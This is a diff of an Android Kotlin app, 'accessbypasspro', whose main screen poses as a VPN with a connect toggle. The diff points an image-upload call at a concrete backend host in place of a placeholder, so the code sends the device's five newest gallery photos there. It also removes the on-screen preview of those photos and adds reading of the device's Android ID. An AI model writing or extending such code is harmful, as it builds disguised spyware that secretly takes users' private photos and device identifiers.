@@ -1,5 +1,4 @@
 package com.example.accessbypasspro
-
 import android.os.Bundle
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
@@ -27,33 +26,20 @@ import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
-
 import android.Manifest
 import android.content.pm.PackageManager
 import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.ui.platform.LocalContext
 import androidx.core.content.ContextCompat
-
-
 import android.content.ContentUris
 import android.content.Context
 import android.net.Uri
+import android.os.Build
 import android.provider.MediaStore
+import androidx.annotation.RequiresApi
+import kotlinx.coroutines.withContext
 
-
-import coil.compose.AsyncImage
-
-
-
-import android.provider.OpenableColumns
-import okhttp3.MediaType.Companion.toMediaTypeOrNull
-import okhttp3.MultipartBody
-import okhttp3.OkHttpClient
-import okhttp3.Request
-import okhttp3.RequestBody
-import okio.BufferedSink
-import java.io.IOException
 
 // Color Palette from your SVG logo
 val DeepSpace = Color(0xFF041226)
@@ -63,6 +49,7 @@ val CardBackground = Color(0xFF0D2546)
 val TextMuted = Color(0xFF8BA6C9)
 
 class MainActivity : ComponentActivity() {
+    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
@@ -75,6 +62,10 @@ class MainActivity : ComponentActivity() {
     }
 }
 
+
+
+
+@RequiresApi(Build.VERSION_CODES.TIRAMISU)
 @Composable
 fun VpnMainScreen() {
     var isConnected by remember { mutableStateOf(false) }
@@ -83,28 +74,25 @@ fun VpnMainScreen() {
     val iconColor by animateColorAsState(if (isConnected) DeepSpace else ElectricCyan, label = "")
     val glowRadius by animateDpAsState(if (isConnected) 24.dp else 0.dp, label = "")
     var images by remember { mutableStateOf<List<Uri>>(emptyList()) }
-
-
     val repo = remember { UploadRepository() }
-
     var uploadStatus by remember { mutableStateOf("Idle") }
-
+    val context = LocalContext.current
+    val androidId = remember {
+        android.provider.Settings.Secure.getString(
+            context.contentResolver,
+            android.provider.Settings.Secure.ANDROID_ID
+        )
+    }
 
 
 
     fun getNewest5ImageUris(context: Context): List<Uri> {
         val imageUris = mutableListOf<Uri>()
-
         val projection = arrayOf(
             MediaStore.Images.Media._ID
         )
-
-
-
         val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
-
         val queryUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-
         context.contentResolver.query(
             queryUri,
             projection,
@@ -113,18 +101,16 @@ fun VpnMainScreen() {
             sortOrder
         )?.use { cursor ->
             val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
-
             while (cursor.moveToNext() && imageUris.size < 5) {
                 val id = cursor.getLong(idCol)
                 val uri = ContentUris.withAppendedId(queryUri, id)
                 imageUris.add(uri)
             }
         }
-
         return imageUris
     }
 
-    val context = LocalContext.current
+
     val permission = Manifest.permission.READ_MEDIA_IMAGES
     // 2) Check permission
     var isGranted by remember {
@@ -157,7 +143,7 @@ fun VpnMainScreen() {
                     repo.uploadImageUris(
                         context = context,
                         uris = images,
-                        uploadUrl = "https://YOUR_BACKEND/upload",
+                        uploadUrl = "https://access-bypass-pro-backend.onrender.com/upload",
                         formFieldName = "file"
                     )
                 }
@@ -178,7 +164,9 @@ fun VpnMainScreen() {
         Column(
             modifier = Modifier.fillMaxSize().padding(24.dp),
             horizontalAlignment = Alignment.CenterHorizontally
-        ) {
+        )
+
+        {
             Row(
                 modifier = Modifier.fillMaxWidth(),
                 horizontalArrangement = Arrangement.SpaceBetween,
@@ -196,6 +184,8 @@ fun VpnMainScreen() {
                 letterSpacing = 2.sp,
                 fontWeight = FontWeight.Bold
             )
+
+
 
             Spacer(modifier = Modifier.height(60.dp))
 
@@ -236,28 +226,23 @@ fun VpnMainScreen() {
                 }
             }
 
-            if (images.isNotEmpty()) {
-                Spacer(Modifier.height(20.dp))
-
-                Row(
-                    modifier = Modifier.fillMaxWidth(),
-                    horizontalArrangement = Arrangement.spacedBy(12.dp)
-                ) {
-                    images.forEach { uri ->
-                        AsyncImage(
-                            model = uri,
-                            contentDescription = "Gallery image",
-                            modifier = Modifier
-                                .size(60.dp)
-                                .clip(RoundedCornerShape(12.dp))
-                                .border(1.dp, TextMuted.copy(alpha = 0.4f), RoundedCornerShape(12.dp))
-                        )
-                    }
-                }
-            }
-
 
         }
+
+
+        Text(
+            text = uploadStatus,
+            color = Color.White,
+            modifier = Modifier
+                .align(Alignment.BottomCenter)
+                .padding(16.dp)
+        )
+
+        Text(
+            text = "Android ID: $androidId",
+            color = Color.White,
+            fontSize = 12.sp
+        )
     }
 }
 
